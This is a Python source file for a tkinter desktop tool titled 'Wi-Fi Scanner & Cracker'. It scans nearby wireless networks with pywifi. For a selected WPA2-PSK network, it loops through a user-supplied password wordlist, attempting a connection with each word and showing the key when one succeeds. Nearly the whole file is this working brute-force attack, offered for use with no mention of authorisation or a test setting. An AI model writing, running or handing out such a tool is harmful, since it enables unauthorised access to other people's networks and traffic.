import time
import pywifi
from pywifi import const
import tkinter as tk
from tkinter import messagebox, Listbox, Scrollbar, Label, Entry, Button, ttk, filedialog

def scan_wifi():
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    
    if not interfaces:
        messagebox.showerror("Error", "No Wi-Fi interfaces found!")
        return
    
    interface = interfaces[0]
    print(f"Using interface: {interface.name()}")  # Debugging line
    
    interface.scan()
    time.sleep(5)  # Allow time for scan
    
    scan_results = interface.scan_results()
    if not scan_results:
        messagebox.showwarning("Warning", "No Wi-Fi networks found!")
        return
    
    listbox.delete(0, tk.END)  # Clear previous results
    for network in scan_results:
        listbox.insert(tk.END, f"{network.ssid} - Signal: {network.signal}")

def crack_password():
    selected_index = listbox.curselection()
    if not selected_index:
        messagebox.showwarning("Warning", "Please select a network first!")
        return
    
    selected_item = listbox.get(selected_index)
    selected_ssid = selected_item.split(" - ")[0]
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.remove_all_network_profiles()
    profile = pywifi.Profile()
    profile.ssid = selected_ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    
    wordlist_file = wordlist_entry.get()
    try:
        with open(wordlist_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        messagebox.showerror("Error", "Wordlist file not found!")
        return
    
    progress_bar['maximum'] = len(passwords)
    for idx, password in enumerate(passwords):
        profile.key = password
        temp_profile = interface.add_network_profile(profile)
        interface.connect(temp_profile)
        time.sleep(4)  # Allow connection time
        
        progress_bar['value'] = idx + 1
        root.update_idletasks()
        
        if interface.status() == const.IFACE_CONNECTED:
            messagebox.showinfo("Success", f"Password for {selected_ssid} is: {password}")
            return
    
    messagebox.showerror("Failed", "Could not crack password with given wordlist.")

def browse_wordlist():
    # Open a file dialog to select the wordlist file
    wordlist_path = filedialog.askopenfilename(title="Select Wordlist File", filetypes=[("Text Files", "*.txt")])
    if wordlist_path:
        wordlist_entry.delete(0, tk.END)  # Clear current text in entry box
        wordlist_entry.insert(0, wordlist_path)  # Insert the selected file path

# GUI Setup
root = tk.Tk()
root.title("Wi-Fi Scanner & Cracker")
root.geometry("600x600")
root.configure(bg="#2C3E50")

Label(root, text="Wi-Fi Scanner & Cracker", font=("Arial", 16, "bold"), fg="white", bg="#2C3E50").pack(pady=10)

frame = tk.Frame(root, bg="#34495E", padx=10, pady=10)
frame.pack(pady=10)

scan_button = Button(frame, text="Scan Wi-Fi", command=scan_wifi, font=("Arial", 12), bg="#1ABC9C", fg="white", padx=10, pady=5)
scan_button.pack(pady=5, fill=tk.X)

listbox = Listbox(frame, width=60, height=10, font=("Arial", 10), bg="#ECF0F1")
listbox.pack()

scrollbar = Scrollbar(frame)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
listbox.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=listbox.yview)

Label(root, text="Wordlist File:", font=("Arial", 12), fg="white", bg="#2C3E50").pack(pady=5)

# Entry for wordlist file path
wordlist_entry = Entry(root, width=50, font=("Arial", 10))
wordlist_entry.pack(pady=5)

# Button to browse and select wordlist file
browse_button = Button(root, text="Browse", command=browse_wordlist, font=("Arial", 12), bg="#2980B9", fg="white", padx=10, pady=5)
browse_button.pack(pady=5)

crack_button = Button(root, text="Crack Password", command=crack_password, font=("Arial", 12), bg="#E74C3C", fg="white", padx=10, pady=5)
crack_button.pack(pady=10, fill=tk.X)

progress_bar = ttk.Progressbar(root, length=400, mode='determinate')
progress_bar.pack(pady=10)

exit_button = Button(root, text="Exit", command=root.quit, font=("Arial", 12), bg="#C0392B", fg="white", padx=10, pady=5)
exit_button.pack(pady=10, fill=tk.X)

root.mainloop()

